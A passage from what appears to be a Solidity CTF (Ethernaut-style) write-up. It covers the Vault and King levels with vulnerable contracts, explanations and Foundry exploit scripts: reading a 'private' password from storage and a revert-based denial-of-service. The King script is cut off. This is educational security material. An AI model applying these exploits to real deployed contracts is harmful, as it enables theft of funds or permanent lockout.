&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To run script :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; source .env
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;ForceSolve.s.sol:ForceSolve&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span&gt;$RPC_URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;8-vault&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#8-vault&quot; aria-label=&quot;Anchor link for: 8-vault&quot;&gt;8 Vault&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;code&gt;Vault.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Vault {
&lt;&#x2F;span&gt;&lt;span&gt;  bool public locked&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  bytes32 private password&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;(bytes32 _password) {
&lt;&#x2F;span&gt;&lt;span&gt;    locked &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    password &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;_password&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;unlock&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bytes32 _password&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(password &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;_password) {
&lt;&#x2F;span&gt;&lt;span&gt;      locked &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;false&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Goal&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;We need to unlock the vault.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;ul&gt;
&lt;li&gt;Solution&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;We can simply call the &lt;code&gt;unlock()&lt;&#x2F;code&gt; function with password. But the password was not publicly accessible.&lt;&#x2F;li&gt;
&lt;li&gt;Declaring a variable &lt;code&gt;private&lt;&#x2F;code&gt; doesn&#x27;t mean that no one can read that variable. Only the other contracts which interacts with it won&#x27;t able to view that variable.&lt;&#x2F;li&gt;
&lt;li&gt;Anyone from off-chain can easily query that value. We see that password is stored in storage slot 1.&lt;&#x2F;li&gt;
&lt;li&gt;We can use foundry cheatcode &lt;code&gt;vm.load&lt;&#x2F;code&gt; to read password and call the &lt;code&gt;unlock()&lt;&#x2F;code&gt; to unlock the vault.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;code&gt;VaultSolve.s.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{Vault} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;src&#x2F;Vault.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract VaultSolve is Script {
&lt;&#x2F;span&gt;&lt;span&gt;    Vault public vault &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Vault&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x80C30D2FE8e45F588d70bc5D530939c7f1b22f94&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;(vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;envUint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;PRIVATE_KEY&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Vault locked : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;vault&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;locked&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        bytes32 password &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;load&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(vault)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bytes32&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;logBytes32&lt;&#x2F;span&gt;&lt;span&gt;(password)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        vault&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;unlock&lt;&#x2F;span&gt;&lt;span&gt;(password)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Vault locked : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;vault&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;locked&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To run script :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; source .env
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;VaultSolve.s.sol:VaultSolve&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span&gt;$RPC_URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;9-king&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#9-king&quot; aria-label=&quot;Anchor link for: 9-king&quot;&gt;9 King&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;code&gt;King.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract King {
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  address king&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  uint public prize&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  address public owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;() payable {
&lt;&#x2F;span&gt;&lt;span&gt;    owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;  
&lt;&#x2F;span&gt;&lt;span&gt;    king &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    prize &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;receive&lt;&#x2F;span&gt;&lt;span&gt;() external payable {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;= &lt;&#x2F;span&gt;&lt;span&gt;prize &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|| &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;owner)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;payable&lt;&#x2F;span&gt;&lt;span&gt;(king)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    king &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    prize &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_king&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public view returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;king&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Goal&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;Be the &lt;code&gt;King&lt;&#x2F;code&gt; and make others dont claim the &lt;code&gt;King&lt;&#x2F;code&gt; position again.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;ul&gt;
&lt;li&gt;Solution&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;Initially check the &lt;code&gt;prize&lt;&#x2F;code&gt; amount that need to send to be the king. And send the &lt;code&gt;prize&lt;&#x2F;code&gt; amount to the &lt;code&gt;King&lt;&#x2F;code&gt; contract.&lt;&#x2F;li&gt;
&lt;li&gt;When someone send the &lt;code&gt;prize&lt;&#x2F;code&gt; amount back to us to claim the king position, we can deny the money.&lt;&#x2F;li&gt;
&lt;li&gt;So, that they wont be the king anymore.&lt;&#x2F;li&gt;
&lt;li&gt;In order to deny the prize, we can write a contract which sends prize to the king contract and dont implement any &lt;code&gt;receive()&#x2F;fallback()&lt;&#x2F;code&gt; function.&lt;&#x2F;li&gt;
&lt;li&gt;This will revert others transaction when they sends prize to us, So, we will remain as the king.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;code&gt;KingSolve.s.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{King} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;src&#x2F;King.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract KingSolve is Script {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;(vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;envUint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;PRIVATE_KEY&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        King king &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;King&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;payable&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xCF1EE241C905C39Add26C82d4a2CCcBC6D070fC2&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        uint _prize &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;king&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;prize&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Current King : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;king&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_king&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
